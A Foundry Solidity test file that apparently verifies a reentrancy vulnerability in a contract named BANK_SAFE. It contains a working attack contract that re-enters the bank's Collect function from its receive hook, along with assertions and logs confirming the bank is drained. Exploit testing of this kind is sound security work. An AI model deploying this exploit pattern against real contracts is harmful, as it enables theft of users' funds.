// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x561eac93c92360949ab1f1403323e6db345cbf31.sol";

contract ReentrancyAttack {
    BANK_SAFE public bank;
    bool private isReentering;
    uint256 public attackAmount;
    
    constructor(address payable _bank) {
        bank = BANK_SAFE(_bank);
    }
    
    function deposit(uint amount) public {
        bank.Deposit{value: amount}();
    }
    
    function initiateAttack(uint256 amount) public {
        attackAmount = amount;
        bank.Collect(amount);
    }
    
    receive() external payable {
        if (!isReentering) {
            isReentering = true;
            bank.Collect(attackAmount);
            isReentering = false;
        }
    }
}

contract BANK_SAFE_Reentrancy_Test is Test {
    BANK_SAFE public bank;
    LogFile public logFile;
    ReentrancyAttack public attacker;
    address private constant ATTACKER_ADDRESS = address(0xBAD);
    
    function setUp() public {
        vm.deal(ATTACKER_ADDRESS, 10 ether);
        vm.prank(ATTACKER_ADDRESS);
        logFile = new LogFile();
        vm.prank(ATTACKER_ADDRESS);
        bank = new BANK_SAFE();
        vm.prank(ATTACKER_ADDRESS);
        bank.SetLogFile(address(logFile));
        vm.prank(ATTACKER_ADDRESS);
        bank.SetMinSum(0);
        
        vm.prank(ATTACKER_ADDRESS);
        attacker = new ReentrancyAttack(payable(address(bank)));
        
        vm.deal(address(attacker), 2 ether);
    }
    
    function testReentrancyExploit() public {
        vm.prank(ATTACKER_ADDRESS);
        attacker.deposit(2 ether);
        
        uint256 initialBankBalance = address(bank).balance;
        assertEq(initialBankBalance, 2 ether, "Initial bank balance incorrect");
        assertEq(bank.balances(address(attacker)), 2 ether, "Attacker bank balance incorrect");
        assertEq(address(attacker).balance, 0, "Attacker contract should have 0 ether after deposit");
        
        // Differential state measurements: PRE-attack
        console.log("--- BEFORE-Trigger Reentrancy Attack ---");
        uint256 preAttackBankETH = address(bank).balance;
        uint256 preAttackAttackerETH = address(attacker).balance;
        uint256 preAttackInternalBalance = bank.balances(address(attacker));
        console.log("Bank ETH balance      :", preAttackBankETH);
        console.log("Attacker ETH balance  :", preAttackAttackerETH);
        console.log("Attacker bank deposit :", preAttackInternalBalance);
        
        console.log("--- Trigger Reentrancy Attack ---");
        vm.prank(ATTACKER_ADDRESS);
        attacker.initiateAttack(1 ether); // Triggering the attack
        
        // Differential state measurements: POST-attack
        console.log("--- AFTER-Trigger Reentrancy Attack ---");
        uint256 postAttackBankETH = address(bank).balance;
        uint256 postAttackAttackerETH = address(attacker).balance;
        uint256 postAttackInternalBalance = bank.balances(address(attacker));
        console.log("Bank ETH balance      :", postAttackBankETH);
        console.log("Attacker ETH balance  :", postAttackAttackerETH);
        console.log("Attacker bank deposit :", postAttackInternalBalance);
        
        // Vulnerability verification logic
        bool bankDrained = preAttackBankETH == 2 ether && postAttackBankETH == 0;
        bool attackerGotFunds = preAttackAttackerETH == 0 && postAttackAttackerETH == 2 ether;
        bool internalBalanceNotUpdated = postAttackInternalBalance == preAttackInternalBalance;
        
        console.log("--- Vulnerability Assessment ---");
        console.log("Bank funds drained?        :", bankDrained ? "YES" : "NO");
        console.log("Attacker gained funds?     :", attackerGotFunds ? "YES" : "NO");
        console.log("Internal balance unchanged?:", internalBalanceNotUpdated ? "YES" : "NO");
        console.log("");
        
        // Final vulnerability verdict
        if (bankDrained && attackerGotFunds && internalBalanceNotUpdated) {
            console.log("Vulnerability Exists: Reentrancy attack succeeded - bank ETH drained, attacker gained funds without updating internal balance records");
        } else {
            console.log("Vulnerability not Exist: Reentrancy attack failed to produce expected state changes");
        }
        
        // Original assertions preserved
        assertEq(address(bank).balance, 0, "Bank funds not drained");
        assertEq(address(attacker).balance, 2 ether, "Attacker contract should have 2 ether after attack");
    }
}